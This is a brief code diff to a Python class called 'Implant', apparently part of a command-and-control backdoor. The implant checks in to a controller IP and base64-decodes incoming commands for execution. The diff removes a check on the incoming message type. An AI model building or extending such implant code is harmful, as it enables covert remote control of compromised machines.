@@ -18,8 +18,6 @@ class Implant(Host):
         self.send(shellpack['ip'], "join")
 
     def instruction(self, shellpack):
-        if shellpack['message'] != 'request':
-            raise Exception
         try:
             cmd = base64.b64decode(shellpack['data'].decode()).decode()
             cmd = cmd.split(" ")
